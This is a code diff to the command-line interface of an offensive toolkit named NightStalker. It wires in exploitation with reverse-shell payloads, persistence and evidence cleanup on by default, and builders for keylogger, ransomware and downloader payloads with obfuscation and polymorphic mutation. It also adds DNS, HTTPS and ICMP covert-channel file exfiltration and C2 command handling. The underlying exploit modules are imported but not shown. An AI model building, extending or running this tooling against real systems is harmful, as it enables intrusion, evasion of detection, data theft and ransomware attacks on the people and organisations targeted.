@@ -24,6 +24,7 @@ from .redteam.infection_watchers import FileMonitor
 from .redteam.self_rebuild import EnvironmentManager, EnvironmentConfig
 from .redteam.payload_builder import PayloadBuilder, PayloadConfig
 from .redteam.webred import WebRedTeam
+from .redteam.advanced_exploitation import AdvancedExploitation, ExploitConfig, ExploitType
 
 # Configure logging
 logging.basicConfig(
@@ -31,6 +32,23 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
+
+# --- NightStalker Home Directory Auto-Detection ---
+def get_nightstalker_home():
+    ns_home = os.environ.get('NIGHTSTALKER_HOME')
+    if not ns_home:
+        if os.name == 'nt':
+            ns_home = os.path.join(os.environ['USERPROFILE'], '.nightstalker')
+        else:
+            ns_home = os.path.join(os.path.expanduser('~'), '.nightstalker')
+    if not os.path.exists(ns_home):
+        os.makedirs(ns_home)
+        print(f"[*] Created NightStalker home directory at {ns_home}")
+    os.environ['NIGHTSTALKER_HOME'] = ns_home
+    return ns_home
+
+NIGHTSTALKER_HOME = get_nightstalker_home()
+# --------------------------------------------------
 
 class NightStalkerCLI:
     """Main CLI interface for NightStalker framework (refactored)"""
@@ -138,7 +156,7 @@ class NightStalkerCLI:
         pentest_parser.add_argument('--output-dir', help='Results output directory')
 
     def _add_redteam_group(self):
-        red_parser = self.subparsers.add_parser('redteam', help='Red team operations (attack, fuzz)')
+        red_parser = self.subparsers.add_parser('redteam', help='Red team operations (attack, fuzz, exploit)')
         red_sub = red_parser.add_subparsers(dest='red_cmd', help='Red team subcommands')
         # Attack
         attack = red_sub.add_parser('attack', help='Execute targeted attack')
@@ -156,6 +174,17 @@ class NightStalkerCLI:
         fuzz.add_argument('--mutation-rate', type=float, default=0.3, help='Mutation rate')
         fuzz.add_argument('--wordlist', help='Custom wordlist file')
         fuzz.add_argument('--output', help='Results output file')
+        # Exploit
+        exploit = red_sub.add_parser('exploit', help='Advanced exploitation')
+        exploit.add_argument('--target', '-t', required=True, help='Target IP address or hostname')
+        exploit.add_argument('--type', choices=['web', 'network', 'social', 'physical', 'supply_chain'], default='web', help='Exploitation type')
+        exploit.add_argument('--chain', choices=['web_to_system', 'network_to_domain', 'social_to_physical'], help='Attack chain type')
+        exploit.add_argument('--payload-type', default='reverse_shell', help='Payload type')
+        exploit.add_argument('--stealth-level', type=int, choices=range(1, 11), default=8, help='Stealth level (1-10)')
+        exploit.add_argument('--persistence', action='store_true', default=True, help='Establish persistence')
+        exploit.add_argument('--cleanup', action='store_true', default=True, help='Clean up evidence')
+        exploit.add_argument('--timeout', type=int, default=300, help='Operation timeout in seconds')
+        exploit.add_argument('--output', help='Results output file')
 
     def _add_exfil_group(self):
         exfil_parser = self.subparsers.add_parser('exfil', help='Data exfiltration')
@@ -319,7 +348,7 @@ class NightStalkerCLI:
             self.print_detailed_help()
             return 1
         except Exception as e:
-            print(f"Error: {e}")
+            logger.error(f"Error: {e}", exc_info=True)
             return 1
 
     def print_detailed_help(self):
@@ -381,7 +410,7 @@ For detailed help on each group or subcommand, use:
             
             stealth_builder = StealthPayloadBuilder()
         except ImportError as e:
-            print(f"[ERROR] Failed to import StealthPayloadBuilder: {e}")
+            logger.error(f"Failed to import StealthPayloadBuilder: {e}", exc_info=True)
             return 1
         
         if args.stealth_cmd == 'build':
@@ -582,17 +611,350 @@ For detailed help on each group or subcommand, use:
         print(f"[Pentest] Target: {args.target}")
         return 0
     def _handle_redteam(self, args):
-        print(f"[RedTeam] Command: {args.red_cmd}")
+        """Handle red team operations"""
+        try:
+            if args.red_cmd == 'attack':
+                print("[RedTeam] Starting attack simulation...")
+                # This would integrate with the red team modules
+                print("[RedTeam] Use the interactive menu for detailed attack options")
+                return 0
+                
+            elif args.red_cmd == 'fuzz':
+                print("[RedTeam] Starting fuzzing operations...")
+                from .redteam.fuzzer import GeneticFuzzer
+                
+                fuzzer = GeneticFuzzer()
+                target = getattr(args, 'target', None) or input("Enter target: ").strip()
+                fuzz_type = getattr(args, 'type', None) or input("Enter fuzz type (http/file/command): ").strip()
+                
+                result = fuzzer.start_fuzzing(target, fuzz_type, 100)
+                
+                if result.get('success'):
+                    print(f"✅ Fuzzing started successfully!")
+                    print(f"🎯 Target: {result.get('target')}")
+                    print(f"📊 Session ID: {result.get('session_id')}")
+                else:
+                    print(f"❌ Fuzzing failed: {result.get('error')}")
+                    return 1
+                    
+            elif args.red_cmd == 'payload':
+                print("[RedTeam] Building payload...")
+                from .redteam.payload_builder import PayloadBuilder
+                
+                builder = PayloadBuilder()
+                payload_type = getattr(args, 'type', None) or input("Payload type: ").strip()
+                target_os = getattr(args, 'os', None) or input("Target OS: ").strip()
+                
+                config = {
+                    'type': payload_type,
+                    'target_os': target_os,
+                    'architecture': 'x64',
+                    'encryption': True,
+                    'obfuscation': True
+                }
+                
+                result = builder.build_payload(config)
+                
+                if result.get('success'):
+                    print(f"✅ Payload built successfully!")
+                    print(f"📁 Location: {result.get('filepath')}")
+                else:
+                    print(f"❌ Payload build failed: {result.get('error')}")
+                    return 1
+                    
+            elif args.red_cmd == 'exfil':
+                print("[RedTeam] Starting data exfiltration...")
+                from .redteam.exfiltration import CovertChannels
+                
+                channels = CovertChannels()
+                data_file = getattr(args, 'data', None) or input("Data file path: ").strip()
+                channel_type = getattr(args, 'channel', None) or input("Channel type (dns/https/icmp): ").strip()
+                
+                if channel_type == 'dns':
+                    domain = input("Domain name: ").strip()
+                    result = channels.dns_exfiltration(data_file, domain)
+                elif channel_type == 'https':
+                    server_url = input("Server URL: ").strip()
+                    api_key = input("API Key: ").strip()
+                    result = channels.https_exfiltration(data_file, server_url, api_key)
+                elif channel_type == 'icmp':
+                    target_ip = input("Target IP: ").strip()
+                    result = channels.icmp_exfiltration(data_file, target_ip)
+                else:
+                    print(f"❌ Unknown channel type: {channel_type}")
+                    return 1
+                
+                if result.get('success'):
+                    print(f"✅ Exfiltration completed!")
+                    print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                else:
+                    print(f"❌ Exfiltration failed: {result.get('error')}")
+                    return 1
+                    
+            elif args.red_cmd == 'monitor':
+                print("[RedTeam] Starting file monitoring...")
+                from .redteam.infection_watchers import FileMonitor
+                
+                monitor = FileMonitor()
+                paths = getattr(args, 'paths', None) or input("Paths to monitor (space-separated): ").strip()
+                paths = paths.split() if isinstance(paths, str) else paths
+                
+                result = monitor.start_monitoring(paths)
+                
+                if result.get('success'):
+                    print(f"✅ File monitoring started!")
+                    print(f"📁 Monitoring: {', '.join(paths)}")
+                else:
+                    print(f"❌ Monitoring failed: {result.get('error')}")
+                    return 1
+                    
+            elif args.red_cmd == 'polymorph':
+                print("[RedTeam] Starting polymorphic payload generation...")
+                from .redteam.polymorph import PolymorphicEngine
+                
+                engine = PolymorphicEngine()
+                payload_type = getattr(args, 'type', None) or input("Payload type: ").strip()
+                mutation_level = getattr(args, 'level', None) or input("Mutation level (1-10): ").strip()
+                
+                result = engine.generate_polymorphic_payload(payload_type, int(mutation_level))
+                
+                if result.get('success'):
+                    print(f"✅ Polymorphic payload generated!")
+                    print(f"📁 Location: {result.get('filepath')}")
+                    print(f"🔄 Mutations: {result.get('mutations', 0)}")
+                else:
+                    print(f"❌ Polymorphic generation failed: {result.get('error')}")
+                    return 1
+                    
+            elif args.red_cmd == 'exploit':
+                print("[RedTeam] Starting advanced exploitation...")
+                
+                # Get exploitation parameters
+                target = getattr(args, 'target', None) or input("Target IP/hostname: ").strip()
+                exploit_type = getattr(args, 'type', None) or input("Exploitation type (web/network/social/physical/supply_chain): ").strip()
+                chain_type = getattr(args, 'chain', None)
+                payload_type = getattr(args, 'payload_type', None) or 'reverse_shell'
+                stealth_level = getattr(args, 'stealth_level', None) or 8
+                persistence = getattr(args, 'persistence', None) or True
+                cleanup = getattr(args, 'cleanup', None) or True
+                timeout = getattr(args, 'timeout', None) or 300
+                
+                # Create exploitation configuration
+                exploit_config = ExploitConfig(
+                    target=target,
+                    exploit_type=ExploitType(exploit_type),
+                    payload_type=payload_type,
+                    stealth_level=stealth_level,
+                    persistence=persistence,
+                    cleanup=cleanup,
+                    timeout=timeout
+                )
+                
+                # Initialize advanced exploitation
+                exploitation = AdvancedExploitation()
+                
+                # Execute exploitation
+                if chain_type:
+                    print(f"[RedTeam] Running attack chain: {chain_type}")
+                    results = exploitation.run_attack_chain(target, chain_type)
+                else:
+                    print(f"[RedTeam] Running single exploitation: {exploit_type}")
+                    results = exploitation.execute_exploit(exploit_config)
+                
+                # Display results
+                if results.get('success', False):
+                    print(f"✅ Exploitation successful on {target}")
+                    if results.get('payload_deployed', False):
+                        print(f"✅ Payload deployed successfully")
+                    if results.get('persistence_established', False):
+                        print(f"✅ Persistence established")
+                    if results.get('c2_established', False):
+                        print(f"✅ Command and control established")
+                else:
+                    print(f"❌ Exploitation failed on {target}")
+                    if 'error' in results:
+                        print(f"❌ Error: {results['error']}")
+                
+                # Save results
+                output_file = getattr(args, 'output', None)
+                if output_file:
+                    with open(output_file, 'w') as f:
+                        json.dump(results, f, indent=2)
+                    print(f"✅ Results saved to {output_file}")
+                else:
+                    # Generate HTML report
+                    report_path = f"exploitation_report_{target}_{int(time.time())}.html"
+                    html_report = exploitation.generate_report(target, results, "html")
+                    with open(report_path, 'w') as f:
+                        f.write(html_report)
+                    print(f"✅ HTML report saved to {report_path}")
+                    
+            else:
+                print(f"[RedTeam] Unknown command: {args.red_cmd}")
+                print("[RedTeam] Available commands: attack, fuzz, payload, exfil, monitor, polymorph")
+                return 1
+                
+        except Exception as e:
+            print(f"[RedTeam] Error: {e}")
+            return 1
+            
         return 0
     def _handle_exfil(self, args):
-        print(f"[Exfil] Data: {args.data}")
-        return 0
+        """Handle data exfiltration operations"""
+        try:
+            from .redteam.exfiltration import CovertChannels
+            
+            channels = CovertChannels()
+            data_file = getattr(args, 'data', None) or input("Data file path: ").strip()
+            channel_list = getattr(args, 'channels', None) or ['https', 'dns']
+            
+            if isinstance(channel_list, str):
+                channel_list = channel_list.split()
+            
+            print(f"[Exfil] Starting data exfiltration via {', '.join(channel_list)}")
+            
+            results = {}
+            for channel in channel_list:
+                try:
+                    if channel == 'dns':
+                        domain = input(f"Domain for {channel} exfiltration: ").strip()
+                        result = channels.dns_exfiltration(data_file, domain)
+                    elif channel == 'https':
+                        server_url = input(f"Server URL for {channel} exfiltration: ").strip()
+                        api_key = input(f"API Key for {channel} exfiltration: ").strip()
+                        result = channels.https_exfiltration(data_file, server_url, api_key)
+                    elif channel == 'icmp':
+                        target_ip = input(f"Target IP for {channel} exfiltration: ").strip()
+                        result = channels.icmp_exfiltration(data_file, target_ip)
+                    else:
+                        print(f"❌ Unknown channel: {channel}")
+                        continue
+                    
+                    results[channel] = result
+                    
+                    if result.get('success'):
+                        print(f"✅ {channel.upper()} exfiltration successful!")
+                        print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                    else:
+                        print(f"❌ {channel.upper()} exfiltration failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ {channel.upper()} exfiltration error: {e}")
+                    results[channel] = {'success': False, 'error': str(e)}
+            
+            # Summary
+            successful = sum(1 for r in results.values() if r.get('success'))
+            total = len(results)
+            print(f"\n📊 Exfiltration Summary: {successful}/{total} channels successful")
+            
+            return 0 if successful > 0 else 1
+            
+        except Exception as e:
+            print(f"[Exfil] Error: {e}")
+            return 1
+
     def _handle_monitor(self, args):
-        print(f"[Monitor] Paths: {args.paths}")
-        return 0
+        """Handle file monitoring operations"""
+        try:
+            from .redteam.infection_watchers import FileMonitor
+            
+            monitor = FileMonitor()
+            paths = getattr(args, 'paths', None) or ['/tmp']
+            
+            if isinstance(paths, str):
+                paths = paths.split()
+            
+            print(f"[Monitor] Starting file monitoring on {', '.join(paths)}")
+            
+            # Get additional options
+            file_types = input("File types to watch (space-separated, default: all): ").strip()
+            file_types = file_types.split() if file_types else []
+            
+            recursive = input("Monitor recursively? (y/n): ").strip().lower() == 'y'
+            
+            result = monitor.start_monitoring(paths, file_types, recursive)
+            
+            if result.get('success'):
+                print(f"✅ File monitoring started successfully!")
+                print(f"📁 Monitoring: {', '.join(paths)}")
+                print(f"🔍 File types: {', '.join(file_types) if file_types else 'All'}")
+                print(f"🔄 Recursive: {recursive}")
+                
+                # Show monitoring status
+                active_monitors = monitor.get_active_monitors()
+                if active_monitors:
+                    print("\n📊 Active Monitors:")
+                    for monitor_info in active_monitors:
+                        print(f"  • {monitor_info['path']} - {monitor_info['status']}")
+                        
+            else:
+                print(f"❌ File monitoring failed: {result.get('error')}")
+                return 1
+                
+            return 0
+            
+        except Exception as e:
+            print(f"[Monitor] Error: {e}")
+            return 1
+
     def _handle_env(self, args):
-        print(f"[Env] Status: {args.status}")
-        return 0
+        """Handle environment management operations"""
+        try:
+            from .redteam.self_rebuild import EnvironmentManager
+            
+            env_manager = EnvironmentManager()
+            
+            if getattr(args, 'status', False):
+                print("[Env] Getting environment status...")
+                status = env_manager.get_status()
+                
+                print("\n🌍 Environment Status:")
+                print(f"  • Portable mode: {status.get('portable', False)}")
+                print(f"  • Cleanup needed: {status.get('cleanup_needed', False)}")
+                print(f"  • Last rebuild: {status.get('last_rebuild', 'Never')}")
+                print(f"  • Environment size: {status.get('size', 'Unknown')}")
+                print(f"  • Platform: {status.get('platform', 'Unknown')}")
+                print(f"  • Python version: {status.get('python_version', 'Unknown')}")
+                
+            elif getattr(args, 'portable', False):
+                print("[Env] Enabling portable mode...")
+                usb_path = getattr(args, 'usb_path', None) or input("USB drive path: ").strip()
+                
+                result = env_manager.enable_portable_mode(usb_path)
+                
+                if result.get('success'):
+                    print("✅ Portable mode enabled successfully!")
+                    print(f"📁 Location: {result.get('path')}")
+                else:
+                    print(f"❌ Portable mode failed: {result.get('error')}")
+                    return 1
+                    
+            elif getattr(args, 'cleanup', False):
+                print("[Env] Performing environment cleanup...")
+                aggressive = input("Aggressive cleanup? (y/n): ").strip().lower() == 'y'
+                
+                result = env_manager.cleanup(aggressive)
+                
+                if result.get('success'):
+                    print("✅ Environment cleanup completed!")
+                    print(f"🗑️ Files removed: {result.get('files_removed', 0)}")
+                    print(f"💾 Space freed: {result.get('space_freed', 'Unknown')}")
+                else:
+                    print(f"❌ Cleanup failed: {result.get('error')}")
+                    return 1
+                    
+            else:
+                print("[Env] Environment management options:")
+                print("  Use --status to show environment status")
+                print("  Use --portable --usb-path <path> to enable portable mode")
+                print("  Use --cleanup to perform environment cleanup")
+                
+            return 0
+            
+        except Exception as e:
+            print(f"[Env] Error: {e}")
+            return 1
+
     def _handle_reverse_shell(self, args):
         """Handle reverse shell deployment commands"""
         deployer = ReverseShellDeployer()
@@ -688,7 +1050,7 @@ For detailed help on each group or subcommand, use:
                 with open(args.target_info, 'r') as f:
                     target_info = json.load(f)
             except Exception as e:
-                print(f"[WebRed] Error loading target info: {e}")
+                logger.error(f"[WebRed] Error loading target info: {e}", exc_info=True)
                 return 1
             
             # Run post-exploitation
@@ -724,7 +1086,7 @@ For detailed help on each group or subcommand, use:
                 with open(args.target_info, 'r') as f:
                     target_info = json.load(f)
             except Exception as e:
-                print(f"[WebRed] Error loading target info: {e}")
+                logger.error(f"[WebRed] Error loading target info: {e}", exc_info=True)
                 return 1
             
             # Backup logs if requested
@@ -892,7 +1254,7 @@ For detailed help on each group or subcommand, use:
                 print(f"✅ Command '{command}' sent to target {target_id} with ID: {command_id}")
                 print(f"🎯 Command ID: {command_id}")
             except Exception as e:
-                print(f"❌ Failed to send command: {e}")
+                logger.error(f"Failed to send command: {e}", exc_info=True)
                 return 1
         
         elif args.c2_cmd == 'results':
@@ -909,7 +1271,7 @@ For detailed help on each group or subcommand, use:
                 print(f"✅ Command results for target {target_id}, ID {command_id}:")
                 print(json.dumps(results, indent=4))
             except Exception as e:
-                print(f"❌ Failed to get command results: {e}")
+                logger.error(f"Failed to get command results: {e}", exc_info=True)
                 return 1
         
         return 0
@@ -980,19 +1342,19 @@ For detailed help on each group or subcommand, use:
         """Handle payload menu"""
         while True:
             print("\n💾 Payloads:")
-            print("  1. Build payload")
-            print("  2. List available payloads")
-            print("  3. Clean built payloads")
+            print("  1. List Payloads")
+            print("  2. Create New Payload")
+            print("  3. Add Example Payloads")
             print("  4. Back to main menu")
             choice = input("Select option (1-4): ").strip()
             if choice == '1':
-                args = argparse.Namespace(payload_cmd='build')
-                self._handle_payload(args)
-            elif choice == '2':
                 args = argparse.Namespace(payload_cmd='list')
                 self._handle_payload(args)
+            elif choice == '2':
+                args = argparse.Namespace(payload_cmd='build')
+                self._handle_payload(args)
             elif choice == '3':
-                args = argparse.Namespace(payload_cmd='clean')
+                args = argparse.Namespace(payload_cmd='build') # Reusing build for example payloads
                 self._handle_payload(args)
             elif choice == '4':
                 return  # Return to main menu
@@ -1062,20 +1424,655 @@ For detailed help on each group or subcommand, use:
         """Handle red team menu"""
         while True:
             print("\n🔴 Red Team Operations:")
-            print("  1. Attack target")
-            print("  2. Fuzz target")
-            print("  3. Back to main menu")
-            choice = input("Select option (1-3): ").strip()
+            print("  1. Payload Builder")
+            print("  2. Polymorphic Engine")
+            print("  3. Covert Channels")
+            print("  4. File Monitoring")
+            print("  5. Environment Management")
+            print("  6. Genetic Fuzzer")
+            print("  7. C2 Operations")
+            print("  8. Advanced Exploitation")
+            print("  9. Back to main menu")
+            
+            choice = input("Select option (1-9): ").strip()
+            
             if choice == '1':
-                args = argparse.Namespace(red_cmd='attack')
-                self._handle_redteam(args)
+                self._handle_payload_builder_menu()
             elif choice == '2':
-                args = argparse.Namespace(red_cmd='fuzz')
-                self._handle_redteam(args)
+                self._handle_polymorph_menu()
             elif choice == '3':
+                self._handle_covert_channels_menu()
+            elif choice == '4':
+                self._handle_file_monitoring_menu()
+            elif choice == '5':
+                self._handle_environment_menu()
+            elif choice == '6':
+                self._handle_fuzzer_menu()
+            elif choice == '7':
+                self._handle_redteam_c2_menu()
+            elif choice == '8':
+                self._handle_advanced_exploitation_menu()
+            elif choice == '9':
                 return
             else:
-                print("Invalid option. Please select 1-3.")
+                print("❌ Invalid option. Please select 1-9.")
+
+    def _handle_payload_builder_menu(self):
+        """Handle payload builder menu"""
+        from .redteam.payload_builder import PayloadBuilder
+        
+        while True:
+            print("\n🔧 Payload Builder:")
+            print("  1. Build custom payload")
+            print("  2. List payload templates")
+            print("  3. Build from template")
+            print("  4. Back to Red Team menu")
+            
+            choice = input("Select option (1-4): ").strip()
+            
+            if choice == '1':
+                print("\n🎯 Custom Payload Builder")
+                print("-" * 30)
+                
+                # Get payload configuration
+                payload_type = input("Payload type (reverse_shell/keylogger/ransomware/downloader): ").strip()
+                target_os = input("Target OS (windows/linux/macos): ").strip()
+                architecture = input("Architecture (x86/x64/arm): ").strip()
+                
+                # Advanced options
+                use_encryption = input("Use encryption? (y/n): ").strip().lower() == 'y'
+                use_obfuscation = input("Use obfuscation? (y/n): ").strip().lower() == 'y'
+                use_polymorphism = input("Use polymorphism? (y/n): ").strip().lower() == 'y'
+                
+                # Build payload
+                try:
+                    builder = PayloadBuilder()
+                    config = {
+                        'type': payload_type,
+                        'target_os': target_os,
+                        'architecture': architecture,
+                        'encryption': use_encryption,
+                        'obfuscation': use_obfuscation,
+                        'polymorphism': use_polymorphism
+                    }
+                    
+                    result = builder.build_payload(config)
+                    
+                    if result.get('success'):
+                        print(f"✅ Payload built successfully!")
+                        print(f"📁 Location: {result.get('filepath')}")
+                        print(f"📊 Size: {result.get('size', 'Unknown')} bytes")
+                    else:
+                        print(f"❌ Payload build failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                try:
+                    builder = PayloadBuilder()
+                    templates = builder.list_templates()
+                    
+                    print("\n📋 Available Templates:")
+                    for i, template in enumerate(templates, 1):
+                        print(f"  {i}. {template['name']} - {template['description']}")
+                        
+                except Exception as e:
+                    print(f"❌ Error listing templates: {e}")
+                    
+            elif choice == '3':
+                print("\n🎯 Template Payload Builder")
+                print("-" * 30)
+                
+                template_name = input("Template name: ").strip()
+                output_path = input("Output path (optional): ").strip()
+                
+                try:
+                    builder = PayloadBuilder()
+                    result = builder.build_from_template(template_name, output_path)
+                    
+                    if result.get('success'):
+                        print(f"✅ Template payload built successfully!")
+                        print(f"📁 Location: {result.get('filepath')}")
+                    else:
+                        print(f"❌ Template build failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-4.")
+
+    def _handle_polymorph_menu(self):
+        """Handle polymorphic engine menu"""
+        from .redteam.polymorph import PolymorphicEngine
+        
+        while True:
+            print("\n🔄 Polymorphic Engine:")
+            print("  1. Generate polymorphic payload")
+            print("  2. Mutate existing payload")
+            print("  3. Show mutation techniques")
+            print("  4. Back to Red Team menu")
+            
+            choice = input("Select option (1-4): ").strip()
+            
+            if choice == '1':
+                print("\n🔄 Polymorphic Payload Generator")
+                print("-" * 35)
+                
+                payload_type = input("Payload type: ").strip()
+                mutation_level = input("Mutation level (1-10): ").strip()
+                
+                try:
+                    engine = PolymorphicEngine()
+                    result = engine.generate_polymorphic_payload(payload_type, int(mutation_level))
+                    
+                    if result.get('success'):
+                        print(f"✅ Polymorphic payload generated!")
+                        print(f"📁 Location: {result.get('filepath')}")
+                        print(f"🔄 Mutations applied: {result.get('mutations', 0)}")
+                    else:
+                        print(f"❌ Generation failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                print("\n🔄 Payload Mutation")
+                print("-" * 20)
+                
+                payload_path = input("Payload file path: ").strip()
+                mutation_level = input("Mutation level (1-10): ").strip()
+                
+                try:
+                    engine = PolymorphicEngine()
+                    result = engine.mutate_payload(payload_path, int(mutation_level))
+                    
+                    if result.get('success'):
+                        print(f"✅ Payload mutated successfully!")
+                        print(f"📁 New location: {result.get('filepath')}")
+                        print(f"🔄 Mutations applied: {result.get('mutations', 0)}")
+                    else:
+                        print(f"❌ Mutation failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                try:
+                    engine = PolymorphicEngine()
+                    techniques = engine.get_mutation_techniques()
+                    
+                    print("\n🔬 Available Mutation Techniques:")
+                    for technique in techniques:
+                        print(f"  • {technique['name']}: {technique['description']}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-4.")
+
+    def _handle_covert_channels_menu(self):
+        """Handle covert channels menu"""
+        from .redteam.exfiltration import CovertChannels
+        
+        while True:
+            print("\n🕵️ Covert Channels:")
+            print("  1. DNS Exfiltration")
+            print("  2. HTTPS Exfiltration")
+            print("  3. ICMP Exfiltration")
+            print("  4. Custom Channel")
+            print("  5. Back to Red Team menu")
+            
+            choice = input("Select option (1-5): ").strip()
+            
+            if choice == '1':
+                print("\n🌐 DNS Exfiltration")
+                print("-" * 20)
+                
+                data_file = input("Data file path: ").strip()
+                domain = input("Domain name: ").strip()
+                dns_server = input("DNS server (default: 8.8.8.8): ").strip() or "8.8.8.8"
+                
+                try:
+                    channels = CovertChannels()
+                    result = channels.dns_exfiltration(data_file, domain, dns_server)
+                    
+                    if result.get('success'):
+                        print(f"✅ DNS exfiltration completed!")
+                        print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                        print(f"🌐 Queries: {result.get('queries', 0)}")
+                    else:
+                        print(f"❌ DNS exfiltration failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                print("\n🔒 HTTPS Exfiltration")
+                print("-" * 20)
+                
+                data_file = input("Data file path: ").strip()
+                server_url = input("Server URL: ").strip()
+                api_key = input("API Key: ").strip()
+                
+                try:
+                    channels = CovertChannels()
+                    result = channels.https_exfiltration(data_file, server_url, api_key)
+                    
+                    if result.get('success'):
+                        print(f"✅ HTTPS exfiltration completed!")
+                        print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                        print(f"🔒 Encrypted: {result.get('encrypted', False)}")
+                    else:
+                        print(f"❌ HTTPS exfiltration failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                print("\n📡 ICMP Exfiltration")
+                print("-" * 20)
+                
+                data_file = input("Data file path: ").strip()
+                target_ip = input("Target IP: ").strip()
+                
+                try:
+                    channels = CovertChannels()
+                    result = channels.icmp_exfiltration(data_file, target_ip)
+                    
+                    if result.get('success'):
+                        print(f"✅ ICMP exfiltration completed!")
+                        print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                        print(f"📡 Packets: {result.get('packets', 0)}")
+                    else:
+                        print(f"❌ ICMP exfiltration failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                print("\n🎯 Custom Channel")
+                print("-" * 15)
+                
+                channel_type = input("Channel type: ").strip()
+                data_file = input("Data file path: ").strip()
+                config = input("Configuration (JSON): ").strip()
+                
+                try:
+                    channels = CovertChannels()
+                    result = channels.custom_exfiltration(channel_type, data_file, config)
+                    
+                    if result.get('success'):
+                        print(f"✅ Custom exfiltration completed!")
+                        print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
+                    else:
+                        print(f"❌ Custom exfiltration failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '5':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-5.")
+
+    def _handle_file_monitoring_menu(self):
+        """Handle file monitoring menu"""
+        from .redteam.infection_watchers import FileMonitor
+        
+        while True:
+            print("\n👁️ File Monitoring:")
+            print("  1. Start monitoring")
+            print("  2. Stop monitoring")
+            print("  3. Show active monitors")
+            print("  4. View logs")
+            print("  5. Back to Red Team menu")
+            
+            choice = input("Select option (1-5): ").strip()
+            
+            if choice == '1':
+                print("\n👁️ Start File Monitoring")
+                print("-" * 25)
+                
+                paths_input = input("Paths to monitor (space-separated): ").strip()
+                paths = paths_input.split() if paths_input else ['/tmp']
+                
+                file_types = input("File types to watch (space-separated, default: all): ").strip()
+                file_types = file_types.split() if file_types else []
+                
+                recursive = input("Monitor recursively? (y/n): ").strip().lower() == 'y'
+                
+                try:
+                    monitor = FileMonitor()
+                    result = monitor.start_monitoring(paths, file_types, recursive)
+                    
+                    if result.get('success'):
+                        print(f"✅ File monitoring started!")
+                        print(f"📁 Monitoring: {', '.join(paths)}")
+                        print(f"🔍 File types: {', '.join(file_types) if file_types else 'All'}")
+                        print(f"🔄 Recursive: {recursive}")
+                    else:
+                        print(f"❌ Monitoring failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                try:
+                    monitor = FileMonitor()
+                    result = monitor.stop_monitoring()
+                    
+                    if result.get('success'):
+                        print("✅ File monitoring stopped!")
+                    else:
+                        print(f"❌ Stop failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                try:
+                    monitor = FileMonitor()
+                    active_monitors = monitor.get_active_monitors()
+                    
+                    if active_monitors:
+                        print("\n📊 Active Monitors:")
+                        for monitor_info in active_monitors:
+                            print(f"  • {monitor_info['path']} - {monitor_info['status']}")
+                    else:
+                        print("📊 No active monitors")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                try:
+                    monitor = FileMonitor()
+                    logs = monitor.get_logs()
+                    
+                    if logs:
+                        print("\n📋 Recent Logs:")
+                        for log in logs[-10:]:  # Show last 10 logs
+                            print(f"  [{log['timestamp']}] {log['event']}: {log['path']}")
+                    else:
+                        print("📋 No logs available")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '5':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-5.")
+
+    def _handle_environment_menu(self):
+        """Handle environment management menu"""
+        from .redteam.self_rebuild import EnvironmentManager
+        
+        while True:
+            print("\n🌍 Environment Management:")
+            print("  1. Show environment status")
+            print("  2. Enable portable mode")
+            print("  3. Perform cleanup")
+            print("  4. Self-rebuild")
+            print("  5. Back to Red Team menu")
+            
+            choice = input("Select option (1-5): ").strip()
+            
+            if choice == '1':
+                try:
+                    env_manager = EnvironmentManager()
+                    status = env_manager.get_status()
+                    
+                    print("\n🌍 Environment Status:")
+                    print(f"  • Portable mode: {status.get('portable', False)}")
+                    print(f"  • Cleanup needed: {status.get('cleanup_needed', False)}")
+                    print(f"  • Last rebuild: {status.get('last_rebuild', 'Never')}")
+                    print(f"  • Environment size: {status.get('size', 'Unknown')}")
+                    
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                print("\n💾 Enable Portable Mode")
+                print("-" * 20)
+                
+                usb_path = input("USB drive path: ").strip()
+                
+                try:
+                    env_manager = EnvironmentManager()
+                    result = env_manager.enable_portable_mode(usb_path)
+                    
+                    if result.get('success'):
+                        print("✅ Portable mode enabled!")
+                        print(f"📁 Location: {result.get('path')}")
+                    else:
+                        print(f"❌ Portable mode failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                print("\n🧹 Environment Cleanup")
+                print("-" * 20)
+                
+                aggressive = input("Aggressive cleanup? (y/n): ").strip().lower() == 'y'
+                
+                try:
+                    env_manager = EnvironmentManager()
+                    result = env_manager.cleanup(aggressive)
+                    
+                    if result.get('success'):
+                        print("✅ Cleanup completed!")
